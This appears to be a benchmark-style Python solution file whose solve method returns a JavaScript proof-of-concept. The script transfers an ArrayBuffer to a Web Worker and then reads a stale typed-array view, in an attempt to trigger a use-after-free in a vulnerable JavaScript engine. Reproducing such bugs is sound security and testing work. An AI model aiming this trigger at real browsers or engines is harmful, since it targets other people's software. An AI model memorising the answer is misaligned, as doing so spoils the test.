class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """
let buffer = new ArrayBuffer(1024 * 4);
let clamped = new Uint8ClampedArray(buffer);
for (let i = 0; i < clamped.length; i++) {
    clamped[i] = i % 256;
}

const worker_script = `
onmessage = function(e) {
    const arr = new Uint8Array(e.data);
    for (let i = 0; i < 100; i++) {
        arr[i] = arr[i] + 1;
    }
    postMessage('processed');
};
`;

const blob = new Blob([worker_script], { type: 'application/javascript' });
const worker_url = URL.createObjectURL(blob);
const worker = new Worker(worker_url);

const transferred_buffer = buffer;
worker.postMessage(transferred_buffer, [transferred_buffer]);

// Give time for worker to process
setTimeout(() => {
    // Access after transfer, should UAF in vulnerable impl
    for (let i = 0; i < 100; i++) {
        const val = clamped[i];
        if (val !== (i % 256)) {
            console.log('Modified:', val);
        }
    }
    worker.terminate();
    URL.revokeObjectURL(worker_url);
}, 100);

console.log('PoC executed');
"""
        return poc.encode('utf-8')